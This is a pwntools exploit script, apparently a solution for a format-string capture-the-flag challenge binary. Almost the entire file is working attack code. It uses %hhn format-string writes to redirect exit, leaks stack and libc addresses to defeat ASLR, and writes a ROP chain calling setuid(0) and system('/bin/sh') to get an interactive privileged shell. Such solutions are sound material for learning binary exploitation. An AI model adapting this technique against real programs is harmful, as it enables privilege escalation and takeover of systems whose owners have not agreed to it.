from pwn import * 


binary = './babyfmt_level10.1_patched'
libc = ELF('./libc.so.6')
p = process(binary)

s = '''
b * printf
b * func+232
'''

def arw(target, dest, num_bytes, payload, param_pos):
	dest_bytes = [0] * num_bytes
	for i in range(num_bytes):
		dest_bytes[i] = (dest >> (i * 8)) & 0xff
		print(hex(dest_bytes[i]))

	
	printed = len(payload) + 0x23     


	for i, byte in enumerate(dest_bytes):

		if byte < printed % 256:
			padding = 256 + byte - (printed % 256)
		else:
			padding = byte - (printed % 256)

		if padding != 0: 
			payload += f"%{padding}c".encode()
			printed += padding
	    
	    
		payload += f"%{param_pos + i}$hhn".encode()


	target = [target + i for i in range(num_bytes)]
	for addr in target:
		payload += p64(addr)
	
	p.sendline(payload)
	
	
	
	
	
	
	
	
	
	
	
	
	
def fmt_payload(dest, num_bytes, payload, param_pos, printed):
	dest_bytes = [0] * num_bytes
	for i in range(num_bytes):
		dest_bytes[i] = (dest >> (i * 8)) & 0xff
		print(hex(dest_bytes[i]))


	for i, byte in enumerate(dest_bytes):

		if byte < printed % 256:
			padding = 256 + byte - (printed % 256)
		else:
			padding = byte - (printed % 256)

		if padding != 0: 
			payload += f"%{padding}c".encode()
			printed += padding #printed is being changed
	    
	    
		payload += f"%{param_pos + i}$hhn".encode()

	return payload, printed # since it's being changed, we need to pass it to the next payload


payload = b"---"


arw(0x404068, 0x4012bd, 3, payload, 51) # exit ---> func


p.clean() # clean the output of the previous payload (arw), so that recvuntil("Your input...") listens to new payload




payload_leak = b"%174$p\n%374$p"
p.sendline(payload_leak)



p.recvuntil("Your input is: ")

p.recvline()
leak = p.recvline().strip().decode()


old_rbp = int(leak, 16) # address in str
rsp = old_rbp - 0xa90 - 0x8 - 0x550

print("rsp: ", hex(rsp))


leak = p.recvline().strip().decode()
libc_leak = int(leak, 16)
print("libc leak: ", hex(libc_leak))
libc_base = libc_leak - 0x229190
print("libc base: ", hex(libc_base))


'''
	pop_rdi,
	0,
	libc_base + libc.sym['setuid'],
	ret,
	pop_rdi,
	bin_sh_addr,
	ret,
	libc_base + libc.sym['system']
'''



# essential addresses
setuid = libc_base + libc.sym['setuid']
system = libc_base + libc.sym['system']
bin_sh_addr = libc_base + 0x1b45bd
print("setuid :", hex(setuid))
print("system :", hex(system))
# gadgets
pop_rdi = 0x0000000000401593





# writing the super long fmt_string
payload = b"--------"
printed = len(payload) + 0x23 

payload, printed = fmt_payload(pop_rdi, 3, payload, 92, printed) # preparing pop rdi
payload, printed = fmt_payload(0, 8, payload, 95, printed) # preparing 0
payload, printed = fmt_payload(setuid, 6, payload, 103, printed) 
payload, printed = fmt_payload(pop_rdi, 3, payload, 109, printed) 
payload, printed = fmt_payload(bin_sh_addr, 6, payload, 112, printed)
payload, printed = fmt_payload(system, 6, payload, 118, printed)

target = rsp
for i in range(3):
	payload += p64(target + i)

target += 8
for i in range(8):
	payload += p64(target + i)

target += 8
for i in range(6):
	payload += p64(target + i)

target += 8
for i in range(3):
	payload += p64(target + i)

target += 8
for i in range(6):
	payload += p64(target + i)

target += 8
for i in range(6):
	payload += p64(target + i)


gdb.attach(p, s)
p.sendline(payload)

p.interactive()








